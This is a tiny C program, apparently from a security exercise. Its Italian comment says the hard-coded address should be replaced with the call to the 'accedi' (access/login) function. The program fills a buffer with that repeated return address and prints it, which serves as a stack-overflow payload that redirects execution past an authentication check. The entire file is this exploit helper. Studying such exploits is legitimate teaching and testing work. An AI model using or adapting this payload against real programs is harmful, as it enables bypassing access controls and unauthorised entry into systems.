#include <stdio.h>

int main(int argc, char** argv)
{
	int i=0; 
	char buf[36];
	for (i=0;i<=32;i+=4) 
		*(long *) &buf[i] = 0x80491f7; //da sostituire con l'indirizzo della call alla funzione accedi
	puts(buf);
}
